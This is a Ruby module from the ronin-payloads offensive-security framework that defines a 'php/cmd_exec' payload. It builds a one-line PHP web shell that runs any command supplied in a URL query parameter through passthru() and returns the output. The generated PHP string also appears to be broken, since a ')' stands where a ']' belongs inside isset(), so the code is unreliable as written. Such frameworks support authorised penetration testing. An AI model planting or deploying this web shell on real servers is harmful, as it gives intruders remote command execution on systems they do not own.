# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2023 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/php_payload'

module Ronin
  module Payloads
    module PHP
      #
      # A basic PHP command exec payload.
      #
      class CmdExec < PHPPayload

        register 'php/cmd_exec'

        summary 'PHP command exec payload'
        description <<~DESC
          A basic injectable PHP payload which executes a command passed in via a
          URL query parameter. The output of the commend will be returned in the
          response body wrapped in `<exec>...</exec>` tags.
        DESC

        param :query_param, String, default: 'cmd',
                                    desc:    'The URL query param to use'

        #
        # Builds the PHP command exec payload.
        #
        def build
          query_param_string = params[:query_param].dump

          @payload = %{<?php if(isset($_REQUEST[#{query_param_string})){echo "<exec>";passthru($_REQUEST[#{query_param_string}]);echo "</exec>";}?>}
        end

      end
    end
  end
end
